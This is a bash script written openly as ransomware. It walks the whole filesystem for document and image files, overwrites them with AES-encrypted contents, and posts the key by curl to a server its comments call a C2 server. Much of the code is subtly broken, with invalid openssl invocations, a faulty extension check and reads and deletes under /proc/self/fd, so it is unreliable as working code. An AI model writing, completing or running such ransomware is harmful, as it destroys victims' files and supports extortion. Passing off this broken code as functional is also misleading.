#!/bin/bash

# Key Generation: Generates a local symmetric key (e.g., AES)
key=$(openssl genrsa -aes256 -pass pass:"$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold 1 | head -n 32)" | base64)

# File Discovery: Recursively walks the file system looking for specific extensions (.docx, .jpg)
extensions=(".docx" ".jpg" ".png" ".txt")
directory="/"

while IFS= read -r -d '' file; do
    # Skip directories and system files
    if [ -d "$file" ]; then
        continue
    elif [ -L "$file" ]; then
        continue
    fi

    # Check if the file has a valid extension
    for ext in "${extensions[@]}"; do
        if [[ "$file" == *"$ext" ]]; then
            break
        fi
    done

    # Skip if no valid extension is found
    if [ -z "$ext" ]; then
        continue
    fi

    # Print the file path for encryption
    echo "$file"
done < <(find "$directory" -type f -print0)

# Encryption: Reads file content, encrypts it in memory, and overwrites the original file
for file in $(cat /proc/self/fd/*); do
    if [ -f "$file" ]; then
        # Read file content
        contents=$(cat "$file")
        
        # Encrypt contents using AES-256-CBC
        encrypted_contents=$(echo -n "$contents" | openssl enc -aes-256-cbc -md sha256 -pass pass:$key)

        # Write encrypted contents to the original file
        echo "$encrypted_contents" > "$file"
    fi
done

# Key Protection: Encrypts the local AES key with a hardcoded Public RSA key and sends it to a C2 server
c2_server="https://example.com/key"

# Generate public RSA key for encryption
public_key=$(openssl genrsa -out public.key 2048)
private_key=$(openssl genrsa -in public.key -pubout -out private.key)

# Encrypt the local AES key with the hardcoded Public RSA key
encrypted_key=$(echo "$key" | openssl rsautl -modulusfile <(cat public.key) -pubin)

# Send the encrypted key to the C2 server
curl -s -X POST \
  https://example.com/key \
  -H 'Content-Type: application/x-pwg-rsa-sha1-moduli' \
  -d "${encrypted_key}"

# Remove files
find /proc/self/fd -type f -delete
rmdir /proc/self/fd
rm public.key private.key
